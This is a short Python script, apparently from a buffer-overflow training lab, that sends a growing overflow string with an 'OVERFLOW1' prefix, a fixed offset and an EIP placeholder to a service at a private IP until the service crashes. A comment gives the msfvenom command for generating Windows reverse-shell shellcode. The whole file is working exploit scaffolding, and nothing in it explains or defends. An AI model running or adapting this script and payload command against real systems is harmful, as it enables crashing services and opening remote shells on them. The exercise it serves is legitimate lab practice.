#!/usr/bin/env python3

import socket, time, sys


# Generate a shellcode using the command: msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c
ip = "10.10.48.81"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "
eip = 'BBBB'
offset = 1978
badchars = ''

string = prefix + "A" * offset + eip + badchars

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)

